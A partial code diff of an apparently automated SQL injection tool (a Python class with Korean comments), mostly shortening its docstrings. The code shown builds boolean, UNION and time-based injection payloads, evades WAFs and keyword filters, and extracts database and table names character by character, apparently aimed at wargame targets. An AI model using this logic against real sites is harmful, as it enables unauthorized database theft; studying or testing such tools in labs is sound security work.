+                    # _resolve_dialect와 같은 견고한 방식.
                     return vuln_entry
 
-                # 이 배치에서 확정된 신호가 없었다 — 배치 하나의 결과를 한 줄로 요약해서 남긴다.
-                # 개별 요청/우회 로그는 병렬로 뒤섞일 수 있지만, 이 요약은 배치가 끝난 뒤 메인
-                # 스레드에서만 찍으므로 항상 배치 순서대로(총 3번) 깔끔하게 나온다.
+                # 이 배치에서 확정된 신호가 없었다 — 배치 하나의 결과를 한 줄로 요약한다. 개별 요청/우회
+                # 로그는 병렬로 뒤섞일 수 있지만, 이 요약은 배치가 끝난 뒤 메인 스레드에서만 찍어 항상
+                # 배치 순서대로 나온다.
                 skip_note   = f", 스킵 {skipped_count}쌍" if skipped_count else ""
                 evade_note  = f", 우회 {evaded_count}쌍" if evaded_count else ""
                 print(f"    [Bool] {batch_label}: 시도 {len(active)}쌍{skip_note}, "
@@ -1187,14 +1100,13 @@ class SQLiStrategy(BaseStrategy):
     def _verify_boolean_equivalence(self, surface, base_fields, build_fn, style: str, quote_char: str,
                                      cand_true_text: str, cand_false_text: str, noise_threshold: int,
                                      waf_hits: list, waf_evasions: list, pool) -> bool:
-        """후보로 잡힌 참/거짓 쌍이 '정말 SQL 불리언이 평가돼서' 갈린 건지, 아니면 앱 필터/
-        상태(해커 감지 메시지, 시도 횟수 리셋 등)가 특정 페이로드 '내용'에 반응해서 우연히
-        갈린 건지 구분한다.
+        """후보로 잡힌 참/거짓 쌍이 정말 SQL 불리언이 평가돼 갈린 건지, 아니면 앱 필터/상태(해커 감지
+        메시지, 시도 횟수 리셋)가 특정 페이로드 내용에 반응해 우연히 갈린 건지 구분한다.
 
-        핵심 원리(논리적 등가 불변성): 진짜 boolean SQLi라면 리터럴이 1=1이든 2=2든 'a'='a'든
-        '항상 참' 조건은 전부 같은 응답으로, '항상 거짓' 조건은 전부 같은 응답으로 뭉쳐야 한다.
-        필터/콘텐츠 기반 차이는 특정 문자열에만 반응하므로 리터럴을 바꾸면 이 뭉침이 깨진다.
-        stateful 앱(요청마다 응답이 흔들림)에서도 클러스터 응집이 깨져 자연히 걸러진다.
+        핵심 원리(논리적 등가 불변성): 진짜 boolean SQLi라면 리터럴이 1=1이든 2=2든 'a'='a'든 항상 참
+        조건은 전부 같은 응답으로, 항상 거짓 조건은 전부 같은 응답으로 뭉쳐야 한다. 필터/콘텐츠 기반
+        차이는 특정 문자열에만 반응하므로 리터럴을 바꾸면 이 뭉침이 깨진다. stateful 앱에서도 클러스터
+        응집이 깨져 자연히 걸러진다.
 
         후보에서 이미 받은 응답(cand_true_text/cand_false_text)을 각 클러스터의 첫 원소로
         재사용하고, 리터럴만 바꾼 변형 2개씩만 추가로 보낸다(요청 4개). 판정:
@@ -1302,9 +1214,9 @@ class SQLiStrategy(BaseStrategy):
         for n in sorted(order_results):
             cur_status, cur_diff = order_results[n]
             status_broke = cur_status is not None and cur_status != baseline_status and prev_status_ok
-            # >=(이상) — diff가 정확히 threshold와 같은 경계 케이스도 신호로 잡는다. 짧은
-            # 응답 페이지에서 noise가 0으로 실측되면 threshold가 바닥값(1) 그대로 고정되는데,
-            # 실제 컬럼 수 경계의 diff가 하필 그 값과 정확히 같게 나오는 경우가 실측된 바 있다.
+            # >=(이상) — diff가 정확히 threshold와 같은 경계 케이스도 신호로 잡는다. 짧은 응답
+            # 페이지에서 noise가 0이면 threshold가 바닥값(1)에 고정되는데, 실제 컬럼 수 경계의
+            # diff가 하필 그 값과 같게 나올 수 있다.
             diff_broke   = cur_diff >= noise_threshold
             if status_broke or diff_broke:
                 union_col = n - 1 if n > 1 else None
@@ -1347,10 +1259,10 @@ class SQLiStrategy(BaseStrategy):
             ),
         }
 
-        # UNION은 참/거짓을 추측하는 게 아니라 결과를 직접 반사시키는 방식이라 훨씬 신뢰도가
-        # 높다 — 그래서 UNION을 먼저 시도하고, UNION으로 db명을 못 뽑았을 때만 blind 이진
-        # 탐색으로 넘어간다. 'Boolean-based로 탐지됨'은 그저 그 방식으로 처음 신호를 찾았다는
-        # 뜻이지 "이 필드는 blind다"라는 확정이 아니므로, blind를 무조건 우선시키지 않는다.
+        # UNION은 참/거짓을 추측하는 게 아니라 결과를 직접 반사시키는 방식이라 훨씬 신뢰도가 높다 —
+        # 그래서 UNION을 먼저 시도하고, UNION으로 db명을 못 뽑았을 때만 blind 이진 탐색으로 넘어간다.
+        # Boolean-based로 탐지됐다는 건 그 방식으로 처음 신호를 찾았다는 뜻이지 이 필드가 blind라는
+        # 확정이 아니라, blind를 무조건 우선하지 않는다.
         if union_col:
             # UNION 추출 전에 방언을 확정한다 — _go_union_extract가 방언별로 다른 브랜치를 쓰기
             # 때문(MySQL: database()/information_schema, SQLite: sqlite_master, PostgreSQL:
@@ -1368,11 +1280,10 @@ class SQLiStrategy(BaseStrategy):
             attack_vectors['UNION'] = {'possible': False}
             vuln_entry['attack_vectors'] = attack_vectors
 
-        # blind로 넘어갈지는 처음에 어떤 방식으로 탐지됐는지(vuln_entry['type'])가 아니라,
-        # "지금까지 확보한 추출 수단이 있는지"로 판단한다 — Error-based(상태코드뿐)로
-        # 확정된 경우도 UNION/error-based 둘 다 실패했으면 마지막 수단으로 blind를 시도할
-        # 가치가 있다. _blind_extract_boolean 자체가 캘리브레이션에서 신호 없으면 요청
-        # 2개만 쓰고 바로 포기하니, 무조건 시도해봐도 비용이 낮다.
+        # blind로 넘어갈지는 처음에 어떤 방식으로 탐지됐는지(vuln_entry['type'])가 아니라, 지금까지
+        # 확보한 추출 수단이 있는지로 판단한다 — Error-based(상태코드뿐)로 확정된 경우도 UNION/error-based
+        # 둘 다 실패했으면 마지막 수단으로 blind를 시도할 가치가 있다. _blind_extract_boolean 자체가
+        # 캘리브레이션에서 신호 없으면 요청 2개만 쓰고 포기하니 비용이 낮다.
         union_db_name = attack_vectors['UNION'].get('db_name')
         if not union_db_name and not db_name_extracted:
             print(f"    [Enum] UNION/error-based 둘 다 db명을 못 뽑음 — blind 이진 탐색으로 대체 시도")
@@ -1384,10 +1295,10 @@ class SQLiStrategy(BaseStrategy):
                 # 못 믿는다 — 아예 건너뛰고 상태와 무관한 시간 오라클(물리 지연)만 쓴다.
                 print(f"    [Enum] stateful 타깃 — content 기반 blind는 신뢰 불가라 스킵, 시간 기반만 시도")
             else:
-                # content(본문 diff) 기반 blind — 이미 확정된 '진짜' 방언(fingerprint/error)이
-                # 있으면 재사용하되, time-based의 변형 이름('MySQL_OR_BENCHMARK')은 SQL_DIALECTS에
-                # 없어 _resolve_dialect가 자기 방식으로 다시 판별한다. 억지로 방언을 주입하면
-                # 신뢰 못 할 content 오라클로 가짜 데이터를 뽑을 위험이 있어 detected_db를 그대로 넘긴다.
+                # content(본문 diff) 기반 blind — 이미 확정된 진짜 방언(fingerprint/error)이 있으면
+                # 재사용하되, time-based 변형 이름(MySQL_OR_BENCHMARK)은 SQL_DIALECTS에 없어 _resolve_dialect가
+                # 다시 판별한다. 억지로 방언을 주입하면 못 믿을 content 오라클로 가짜 데이터를 뽑을
+                # 위험이 있어 detected_db를 그대로 넘긴다.
                 blind_db_name, blind_dialect = self._blind_extract_boolean(
                     surface, base_fields, injection_prefix, comment, None, waf_hits, waf_evasions,
                     known_db=vuln_entry.get('detected_db'), page_noise=page_noise,
@@ -1479,9 +1390,9 @@ class SQLiStrategy(BaseStrategy):
         return f"{lhs}>=0" if truth else f"{lhs}<0"
 
     def _substr_expr(self, surface, dialect: str, x: str, pos: int, length: int) -> str:
-        """부분문자열 함수를 밴 안 걸리는 별칭으로 고른다 — MySQL은 SUBSTR/SUBSTRING/MID가
-        동작이 같아서, 'substring'이 밴이면 SUBSTR, 그것도 밴이면 MID로 넘어간다(정답 코드가
-        MID를 쓴 이유). 함수 '이름'만 밴 여부를 보므로(인자 x 안의 밴 토큰은 별개) 정확히 고른다."""
+        """부분문자열 함수를 밴 안 걸리는 별칭으로 고른다 — MySQL은 SUBSTR/SUBSTRING/MID가 동작이
+        같아 substring이 밴이면 SUBSTR, 그것도 밴이면 MID로 넘어간다. 함수 이름만 밴 여부를 보므로
+        (인자 x 안의 밴 토큰은 별개) 정확히 고른다."""
         if dialect == 'MySQL':
             for fn in ('SUBSTR', 'SUBSTRING', 'MID'):
                 if self._banned_in(surface, fn) is None:
@@ -1490,7 +1401,7 @@ class SQLiStrategy(BaseStrategy):
 
     def _ord_expr(self, surface, dialect: str, x: str) -> str:
         """문자→코드 함수를 밴 안 걸리는 별칭으로 — MySQL은 ASCII/ORD가 (ASCII 범위에서) 동일.
-        'ascii'가 밴이면 ORD로 넘어간다."""
+        ascii가 밴이면 ORD로 넘어간다."""
         if dialect == 'MySQL':
             for fn in ('ASCII', 'ORD'):
                 if self._banned_in(surface, fn) is None:
@@ -1498,16 +1409,15 @@ class SQLiStrategy(BaseStrategy):
         return SQL_DIALECTS[dialect]['ord_fn'](x)
 
     def _oracle_live(self, surface, oracle, probe_lhs: str, label: str) -> bool:
-        """정합성 앵커 — '조건이 거짓이라 신호가 없는 것'과 '우리 주입이 애초에 SQL에서 실행조차
-        안 돼서(밴 토큰/문법오류/상태리셋) 신호가 없는 것'을 구분한다.
+        """정합성 앵커 — 조건이 거짓이라 신호가 없는 것과, 우리 주입이 애초에 SQL에서 실행조차 안 돼
+        (밴 토큰/문법오류/상태리셋) 신호가 없는 것을 구분한다.
 
-        probe_lhs는 실제 판독의 좌변(예: 'LENGTH(database())', 'ASCII(SUBSTR(pw,1,1))')이라
-        실제 페이로드와 밴/실행 노출이 동일하다. LENGTH()/ASCII()류는 음수가 안 나오므로
-        '>=0'은 항상 참, '<0'은 항상 거짓 — 결과가 수학적으로 확정돼 있다. 항상참이 참 신호를,
-        항상거짓이 거짓 신호를 '둘 다' 낼 때만 채널이 살아있다고 본다. probe_lhs에 밴 토큰
-        (예: database)이 섞여 필터되면 '>=0'조차 참 신호를 못 내(양쪽 다 거부 페이지로 뭉갬)
-        여기서 걸린다. 대상이 NULL인 경우('>=0'이 NULL→falsy)도 함께 걸리는데, NULL이든 밴이든
-        어차피 못 뽑는 건 같아 가짜 값을 만들지 않고 정직하게 중단하는 게 맞다."""
+        probe_lhs는 실제 판독의 좌변(예: LENGTH(database()), ASCII(SUBSTR(pw,1,1)))이라 실제 페이로드와
+        밴/실행 노출이 동일하다. LENGTH()/ASCII()류는 음수가 안 나오므로 >=0은 항상 참, <0은 항상 거짓
+        — 결과가 수학적으로 확정돼 있다. 항상참이 참 신호를, 항상거짓이 거짓 신호를 둘 다 낼 때만 채널이
+        살아있다고 본다. probe_lhs에 밴 토큰(예: database)이 섞여 필터되면 >=0조차 참 신호를 못 내(양쪽
+        다 거부 페이지로 뭉갬) 여기서 걸린다. 대상이 NULL인 경우(>=0이 NULL→falsy)도 함께 걸리는데,
+        NULL이든 밴이든 못 뽑는 건 같아 가짜 값을 만들지 않고 정직하게 중단하는 게 맞다."""
         cond_true  = self._cmp_always(surface, probe_lhs, True)   # 항상 참 ('>' 밴이면 BETWEEN)
         cond_false = self._cmp_always(surface, probe_lhs, False)  # 항상 거짓
         always_true  = oracle(cond_true)
@@ -1521,10 +1431,10 @@ class SQLiStrategy(BaseStrategy):
     def _extract_with_oracle(self, surface, oracle, dialect: str, expr: str | None, label: str) -> str | None:
         """oracle(condition)->bool|None + 이진 탐색으로 expr 값을 문자 단위로 추출한다.
 
-        content 오라클(_bool_oracle)이든 시간 오라클(_time_oracle)이든 '이 SQL 불리언 조건이
-        참인가?'만 답하면 되므로, 길이·문자 이진 탐색 로직은 오라클 종류와 무관하게 공용이다.
-        expr=None이면 그 방언의 current_db 표현식을 뽑는다(current_db 개념이 없는 방언이면 None).
-        문자 추출엔 방언별 ord_fn/substr_fn을 쓴다.
+        content 오라클(_bool_oracle)이든 시간 오라클(_time_oracle)이든 이 SQL 불리언 조건이 참인가만
+        답하면 되므로, 길이·문자 이진 탐색 로직은 오라클 종류와 무관하게 공용이다. expr=None이면 그
+        방언의 current_db 표현식을 뽑는다(current_db 개념이 없는 방언이면 None). 문자 추출엔 방언별
+        ord_fn/substr_fn을 쓴다.
         """
         d = SQL_DIALECTS[dialect]
         if expr is None:
@@ -1534,8 +1444,8 @@ class SQLiStrategy(BaseStrategy):
             expr = d['current_db']
 
         # 정합성 앵커 — 첫 길이 판독을 믿기 전에, 같은 좌변으로 이 페이로드가 실제로 SQL에서
-        # 실행되는지 확인한다. 실패하면 이후 '거짓' 판독이 전부 '밴/미실행'일 수 있어 신뢰 불가
-        # → 여기서 중단한다(가짜 '길이 0' 방지).
+        # 실행되는지 확인한다. 실패하면 이후 거짓 판독이 전부 밴/미실행일 수 있어 신뢰 불가
+        # → 여기서 중단한다(가짜 길이 0 방지).
         if not self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
             return None
 
@@ -1544,8 +1454,8 @@ class SQLiStrategy(BaseStrategy):
             print(f"    [{label}] {expr} 길이 확인 실패 (요청 실패)")
             return None
         if length == 0:
-            # 시작 앵커는 통과했으니 원래는 '진짜 빈 값'이지만, 추출 도중 상태가 리셋돼 채널이
-            # 죽었을 수도 있다 — 앵커를 다시 찍어 '진짜 빈 값'과 '도중에 死'을 가른다.
+            # 시작 앵커는 통과했으니 원래는 진짜 빈 값이지만, 추출 도중 상태가 리셋돼 채널이
+            # 죽었을 수도 있다 — 앵커를 다시 찍어 진짜 빈 값과 도중 死를 가른다.
             if self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
                 print(f"    [{label}] {expr} 길이=0 (빈 값 — 앵커 재확인 통과)")
             else:
@@ -1582,21 +1492,17 @@ class SQLiStrategy(BaseStrategy):
                           ref_true_text: str, ref_false_text: str,
                           waf_hits: list, waf_evasions: list,
                           known_db: str | None = None) -> str | None:
-        """에러 메시지도 안 보이고 SLEEP도 못 쓰는(또는 아직 안 한) blind 상황에서, 참/거짓
-        오라클만으로 DB 방언(SQLite/MySQL/PostgreSQL)을 알아낸다.
+        """에러 메시지도 안 보이고 SLEEP도 못 쓰는(또는 아직 안 한) blind 상황에서, 참/거짓 오라클만으로
+        DB 방언(SQLite/MySQL/PostgreSQL)을 알아낸다.
 
-        known_db(이미 채워진 vuln_entry['detected_db'] — 숫자형 경로의 dialect 판별,
-        _resolve_dialect_for_union의 사전 판별, 또는 UNION 추출 성공 시 기록된 값)가
-        SQL_DIALECTS에 있는 이름이면 그걸 그대로 재사용하고 요청을 전혀 안 보낸다 —
-        이미 한 번 판별이 끝난 필드는 다시 물을 필요가 없다. 없거나(아직 아무 경로도
-        방언을 못 정한 경우) 우리 방언 테이블에 없는 값('Unknown'/'MSSQL'/'Oracle')이면
-        직접 프로빙한다. (이 함수 자체가 예전 _fingerprint_db(raw 길이+AND-LIKE)를 대체한
-        견고한 오라클 기반 판별이다.)
+        known_db(이미 채워진 detected_db — 숫자형 경로의 dialect 판별, _resolve_dialect_for_union의 사전
+        판별, 또는 UNION 추출 성공 시 기록된 값)가 SQL_DIALECTS에 있는 이름이면 그대로 재사용하고 요청을
+        안 보낸다 — 이미 판별이 끝난 필드는 다시 물을 필요가 없다. 없거나 우리 방언 테이블에 없는 값
+        (Unknown/MSSQL/Oracle)이면 직접 프로빙한다.
 
-        각 방언의 version_fn으로 "항상 참"/"항상 거짓" 조건을 만들어 실제로 참/거짓이
-        갈리는지 본다 — 방언이 틀리면 그 함수가 없어서 쿼리 자체가 깨져 두 probe가 같은
-        (에러) 응답으로 뭉개지고, 방언이 맞으면 참/거짓이 정상적으로 갈린다. 필드당 한 번만
-        하고 결과를 캐싱한다.
+        각 방언의 version_fn으로 항상 참/항상 거짓 조건을 만들어 실제로 참/거짓이 갈리는지 본다 — 방언이
+        틀리면 그 함수가 없어 쿼리가 깨져 두 probe가 같은 에러 응답으로 뭉개지고, 맞으면 참/거짓이 정상적으로
+        갈린다. 필드당 한 번만 하고 결과를 캐싱한다.
         """
         key = (surface.url, surface.param)
         cached = self._dialect_cache.get(key)
@@ -1630,11 +1536,10 @@ class SQLiStrategy(BaseStrategy):
     def _resolve_dialect_for_union(self, surface, base_fields, injection_prefix: str, comment: str,
                                     vuln_entry: dict, waf_hits: list, waf_evasions: list,
                                     page_noise: int) -> None:
-        """UNION 추출 직전에 방언을 확정해 vuln_entry['detected_db']에 채운다 — 예전 _fingerprint_db
-        (raw 길이 + AND-LIKE, 취약)를 대체한다. _blind_extract_boolean과 동일하게 OR (1=1)/(1=2)로
-        기준 텍스트를 잡아 content 오라클이 성립할 때만(캘리브레이션 diff ≥ 노이즈 문턱) _resolve_dialect
-        로 판별하고, 아니면 조용히 넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를 _go_union_extract
-        가 기록). blind로 넘어가는 경우 _resolve_dialect 캐시를 그대로 재사용한다."""
+        """UNION 추출 직전에 방언을 확정해 vuln_entry['detected_db']에 채운다. _blind_extract_boolean과
+        똑같이 OR (1=1)/(1=2)로 기준 텍스트를 잡아 content 오라클이 성립할 때만(캘리브레이션 diff ≥ 노이즈
+        문턱) _resolve_dialect로 판별하고, 아니면 조용히 넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를
+        _go_union_extract가 기록). blind로 넘어가는 경우 _resolve_dialect 캐시를 그대로 재사용한다."""
         t_status, t_body, _, _, _ = self._send_evading(
             surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true)', waf_hits, waf_evasions,
         )
@@ -1657,11 +1562,10 @@ class SQLiStrategy(BaseStrategy):
                                 known_db: str | None = None, page_noise: int = 0) -> tuple[str | None, str | None]:
         """참/거짓 오라클 + 이진 탐색으로 expr 값을 문자 단위로 뽑아낸다.
 
-        expr=None이면 "현재 DB명을 뽑아라"라는 뜻으로 해석한다 — 캘리브레이션 직후 DB
-        방언(SQLite/MySQL/PostgreSQL)을 먼저 판별해서, 그 방언의 current_db 표현식을
-        찾아 쓴다. SQLite처럼 현재 DB명 개념이 없는 방언이면 방언만 확정하고 이 단계는
-        스킵한다(추출값 None, 방언은 반환). expr에 구체적 SQL 표현식을 직접 넘기면
-        그대로 사용하되, 문자 추출엔 여전히 판별된 방언의 ord_fn/substr_fn을 쓴다.
+        expr=None이면 현재 DB명을 뽑으라는 뜻으로 해석한다 — 캘리브레이션 직후 DB 방언
+        (SQLite/MySQL/PostgreSQL)을 먼저 판별해, 그 방언의 current_db 표현식을 찾아 쓴다. SQLite처럼
+        현재 DB명 개념이 없는 방언이면 방언만 확정하고 이 단계는 스킵한다(추출값 None, 방언은 반환).
+        expr에 구체적 SQL 표현식을 직접 넘기면 그대로 쓰되, 문자 추출엔 판별된 방언의 ord_fn/substr_fn을 쓴다.
 
         known_db는 그대로 _resolve_dialect에 넘겨서, 이미 확정된 DB가 있으면 재프로빙을
         건너뛴다.
@@ -1721,19 +1625,16 @@ class SQLiStrategy(BaseStrategy):
     def _time_oracle(self, surface, base_fields, injection_prefix: str, comment: str, condition: str,
                      profile: tuple, seconds: int, benchmark_n: int, threshold: float,
                      waf_hits: list, waf_evasions: list) -> bool | None:
-        """condition이 참일 때만 DB가 지연되도록(IF/CASE로 지연함수를 조건부 실행) 만들어,
-        응답 시간으로 참/거짓을 판정한다 — 본문이 필터로만 갈려 content 오라클을 못 쓰는 순수
-        time-based에서 유일한 추출 수단.
+        """condition이 참일 때만 DB가 지연되도록(IF/CASE로 지연함수를 조건부 실행) 만들어, 응답 시간으로
+        참/거짓을 판정한다 — 본문이 필터로만 갈려 content 오라클을 못 쓰는 순수 time-based에서 유일한
+        추출 수단.
 
-        중요(무행/side-effect-free): 오라클 페이로드는 절대 '행을 반환하면 안 된다'. 로그인 폼
-        WHERE에 `OR (SELECT 1 ...)`처럼 참이 되는 값을 넣으면 행이 반환돼, 앱이 로그인 성공으로
-        처리하거나(더블체크/리셋/잠금/로깅 등) 심지어 데이터를 바꾸는 부작용이 생긴다(실측:
-        어떤 타깃은 인젝션이 행을 반환할 때마다 계정 비번을 리셋해 추출 자체를 자멸시켰다).
-        BENCHMARK/SLEEP은 둘 다 '0'을 반환하므로 `IF(cond, 지연, 0)`의 값은 항상 0이다. 이를
-        파생 테이블 (SELECT IF(...))x로 감싸 한 번만 materialize하고(행마다 반복 평가 방지 —
-        맨 스칼라로 넣으면 행 수만큼 곱해져 타임아웃남), 바깥을 SELECT 0으로 해 값 0 → `OR 0`이라
-        '행을 반환하지 않게' 한다(로그인 폼의 리셋/로그인/잠금 부작용 방지). 관찰되는 건 지연뿐.
-        반환: 지연됨(참)/안 됨(거짓)/요청 실패(None)."""
+        중요(무행/side-effect-free): 오라클 페이로드는 절대 행을 반환하면 안 된다. 로그인 폼 WHERE에
+        OR (SELECT 1 ...)처럼 참이 되는 값을 넣으면 행이 반환돼, 앱이 로그인 성공 처리(리셋/잠금/로깅)나
+        심지어 데이터 변경 같은 부작용을 낼 수 있다. BENCHMARK/SLEEP은 둘 다 0을 반환하므로 IF(cond, 지연, 0)의
+        값은 항상 0이다. 이를 파생 테이블 (SELECT IF(...))x로 감싸 한 번만 materialize하고(행마다 반복 평가
+        방지 — 맨 스칼라로 넣으면 행 수만큼 곱해져 타임아웃), 바깥을 SELECT 0으로 해 값 0 → OR 0이라 행을
+        반환하지 않게 한다. 관찰되는 건 지연뿐. 반환: 지연됨(참)/안 됨(거짓)/요청 실패(None)."""
         dialect, conn, timefn = profile
         run_expr  = self._timed_expr(timefn, seconds, benchmark_n, True)
         zero_expr = self._timed_expr(timefn, seconds, benchmark_n, False)
@@ -1800,16 +1701,15 @@ class SQLiStrategy(BaseStrategy):
     def _dialect_bytes_literal(dialect: str | None, raw: bytes) -> str:
         """방언에 안전하게 raw 바이트열을 나타내는 SQL 표현식을 만든다.
 
-        MySQL은 0x{hex}(hex 문자열 리터럴)가 그 자체로 문자열 취급이라 그대로 쓰면 되지만,
-        SQLite에서 0x...는 16진수 '정수' 리터럴이라(||로 이어붙이면 10진수 텍스트가 돼버려서
-        원하는 바이트가 안 나옴) char()로 문자 코드를 직접 만들어야 한다.
+        MySQL은 0x{hex}(hex 문자열 리터럴)가 그 자체로 문자열 취급이라 그대로 쓰면 되지만, SQLite에서
+        0x...는 16진수 정수 리터럴이라(||로 이어붙이면 10진수 텍스트가 돼 원하는 바이트가 안 나옴)
+        char()로 문자 코드를 직접 만들어야 한다.
 
-        SQLite의 char()는 원래 char(a,b,c,...)처럼 여러 코드를 한 번에 받을 수 있지만,
-        일부러 한 글자씩(char(a), char(b), ...) 나눠서 ||로 체이닝한다 — baby-sqlite처럼
-        콤마 자체를 통째로 필터링하는 사이트(UNION 컬럼 목록뿐 아니라 함수 인자 사이 콤마도
-        막힘, 실측 확인됨)에서는 char(a,b,c) 안의 콤마조차 걸리기 때문이다. PostgreSQL의
-        chr()는 애초에 한 글자만 받아서 원래도 이 방식이 필요했다 — 두 방언을 같은 로직으로
-        통일한다. dialect가 안 정해졌으면 기존 동작(MySQL hex 리터럴)을 그대로 유지한다.
+        SQLite의 char()는 원래 char(a,b,c,...)처럼 여러 코드를 한 번에 받지만, 일부러 한 글자씩
+        (char(a), char(b), ...) 나눠 ||로 체이닝한다 — 콤마 자체를 필터링하는 사이트(함수 인자 사이
+        콤마까지 막힘)에서는 char(a,b,c) 안의 콤마조차 걸리기 때문이다. PostgreSQL의 chr()는 애초에 한
+        글자만 받아 원래도 이 방식이 필요했다 — 두 방언을 같은 로직으로 통일한다. dialect가 안 정해졌으면
+        기존 동작(MySQL hex 리터럴)을 유지한다.
         """
         clean = (dialect or '').replace(' (추정)', '').strip()
         if clean == 'SQLite':
@@ -1835,17 +1735,15 @@ class SQLiStrategy(BaseStrategy):
                            injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
         """각 컬럼 위치에 마커를 넣어 어느 컬럼이 화면에 반사되는지 찾는다.
 
-        마커를 리터럴 문자열('sqli7e7esqli')로 그냥 박아넣으면, 이 앱처럼 입력받은 쿼리
-        원문을 디버깅용으로 그대로 echo하는 사이트에서는 실제 어느 컬럼이 반사되는지와
-        무관하게 "일단 페이로드에 그 글자가 들어있으니" 무조건 매치되는 오탐이 생긴다.
-        _go_union_extract가 0x7e7e 같은 hex 리터럴을 쓰는 것과 같은 이유로, 여기서도
-        CONCAT(hex, hex)로 쪼개서 넣는다 — 실행 전 원문에는 마커 문자열이 존재하지 않고,
-        실제로 SELECT되어 화면에 반사됐을 때만 CONCAT 결과로 완성된다.
+        마커를 리터럴 문자열(sqli7e7esqli)로 그냥 박으면, 입력받은 쿼리 원문을 디버깅용으로 그대로
+        echo하는 사이트에서는 실제로 어느 컬럼이 반사되는지와 무관하게 페이로드에 그 글자가 들어있다는
+        이유로 무조건 매치되는 오탐이 생긴다. _go_union_extract가 0x7e7e 같은 hex 리터럴을 쓰는 것과 같은
+        이유로, 여기서도 CONCAT(hex, hex)로 쪼개 넣는다 — 실행 전 원문에는 마커가 없고, 실제로 SELECT돼
+        화면에 반사됐을 때만 CONCAT 결과로 완성된다.
 
-        반사 안 시킬 나머지 컬럼은 _go_union_extract와 동일하게 NULL로 채운다 — 예전엔
-        ''(빈 문자열)를 썼는데, PostgreSQL처럼 UNION 컬럼 타입을 엄격히 맞추는 DB에서 실제
-        컬럼이 숫자/날짜 타입이면 문자열 리터럴이 타입 불일치 에러를 내서 UNION 전체가
-        깨질 수 있다. NULL은 타입이 없어 어떤 컬럼 타입에도 맞춰지므로 더 안전하다.
+        반사 안 시킬 나머지 컬럼은 NULL로 채운다 — 빈 문자열은 PostgreSQL처럼 UNION 컬럼 타입을 엄격히
+        맞추는 DB에서 실제 컬럼이 숫자/날짜면 타입 불일치 에러로 UNION 전체가 깨질 수 있다. NULL은 타입이
+        없어 어떤 컬럼 타입에도 맞춰져 더 안전하다.
         """
         key = (surface.url, surface.param)
         dialect = vuln_entry.get('detected_db')
@@ -1857,11 +1755,10 @@ class SQLiStrategy(BaseStrategy):
         ])
         reflect_col = None
         reflect_payload = None
-        # ORDER BY는 이미 quote_char로 성공했을 수 있는 다른 모양(shape)의 페이로드라, 그게
-        # 통과했다고 UNION SELECT도 통과한다는 보장은 없다 — 그래서 여기서도 boolean/error-time
-        # 과 같은 원칙으로, 첫 컬럼 시도는 self._quote_signal 값과 무관하게 반드시 직접 해보고
-        # '그것도' 막혔을 때만(기존 증거 + 이 단계 자체 확인, 두 증거가 겹칠 때만) 나머지
-        # 컬럼을 스킵한다.
+        # ORDER BY는 이미 quote_char로 성공했을 수 있는 다른 shape의 페이로드라, 그게 통과했다고 UNION
+        # SELECT도 통과한다는 보장은 없다 — 그래서 여기서도 boolean/error-time과 같은 원칙으로, 첫 컬럼
+        # 시도는 self._quote_signal 값과 무관하게 반드시 직접 해보고 그것까지 막혔을 때만(기존 증거 + 이
+        # 단계 자체 확인, 두 증거가 겹칠 때만) 나머지 컬럼을 스킵한다.
         union_quote_hopeless = False
         for col_idx in range(1, col_count + 1):
             if union_quote_hopeless:
@@ -1873,10 +1770,9 @@ class SQLiStrategy(BaseStrategy):
                 surface, base_fields, payload, f'enum(union-reflect col{col_idx})', waf_hits, waf_evasions,
             )
             if status is None and dialect == 'SQLite':
-                # "select"라는 단어 자체를 필터링하는 사이트(입력을 소문자로 바꾼 뒤 부분
-                # 문자열로 검사하는 baby-sqlite류)에서는 EVASION_TRANSFORMS(공백/대소문자
-                # 변형)로 못 뚫는다 — SELECT라는 단어를 아예 안 쓰는 VALUES(...) 문법
-                # (SQLite가 UNION의 두 번째 분기로 SELECT 대신 오래전부터 지원)으로 재시도한다.
+                # select라는 단어 자체를 필터링하는 사이트(입력을 소문자로 바꾼 뒤 부분 문자열로
+                # 검사)에서는 EVASION_TRANSFORMS(공백/대소문자 변형)로 못 뚫는다 — SELECT를 아예 안
+                # 쓰는 VALUES(...) 문법(SQLite가 UNION의 두 번째 분기로 오래전부터 지원)으로 재시도한다.
                 values_payload = f"{injection_prefix} UNION VALUES({','.join(cols)}) {comment}"
                 status, body, _, used_payload, _ = self._send_evading(
                     surface, base_fields, values_payload, f'enum(union-reflect-values col{col_idx})',
@@ -1903,11 +1799,10 @@ class SQLiStrategy(BaseStrategy):
                            injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
         """반사 컬럼을 이용해 db명과 테이블 목록을 추출한다.
 
-        db명 개념/테이블 목록 조회 방식이 방언마다 달라서(SQLite는 파일 하나가 곧 DB라
-        이름 개념이 없고 sqlite_master로 테이블을 나열하며, MySQL/PostgreSQL은
-        information_schema를 쓴다) 방언별로 다른 쿼리를 쓴다. 문자열 리터럴('table',
-        'public' 등)도 quote 없이 _dialect_bytes_literal로 만든다 — baby-sqlite처럼
-        따옴표까지 필터링하는 사이트를 실측으로 확인했기 때문이다.
+        db명 개념/테이블 목록 조회 방식이 방언마다 달라서(SQLite는 파일 하나가 곧 DB라 이름 개념이 없고
+        sqlite_master로 테이블을 나열하며, MySQL/PostgreSQL은 information_schema를 쓴다) 방언별로 다른 쿼리를
+        쓴다. 문자열 리터럴(table, public 등)도 quote 없이 _dialect_bytes_literal로 만든다 — 따옴표까지
+        필터링하는 사이트에 대응하기 위해서다.
         """
         dialect = vuln_entry.get('detected_db')
         clean = (dialect or '').replace(' (추정)', '').strip()
@@ -1921,12 +1816,11 @@ class SQLiStrategy(BaseStrategy):
             return f"{injection_prefix} UNION {keyword}{','.join(cols)}{closing} {comment}"
 
         if clean == 'SQLite':
-            # SQLite는 current_db 개념이 없어(SQL_DIALECTS 참고) db_name 단계 자체를
-            # 스킵하고 바로 테이블 목록으로 간다. sqlite_master가 MySQL의
-            # information_schema.tables 역할을 한다. 단, 이 expr 자체가 sqlite_master를
-            # 읽는 중첩 SELECT를 포함해서 "select" 단어 필터는 VALUES로도 못 피한다
-            # (테이블을 실제로 읽으려면 SELECT가 필요해서) — 그래도 바깥쪽 UNION만이라도
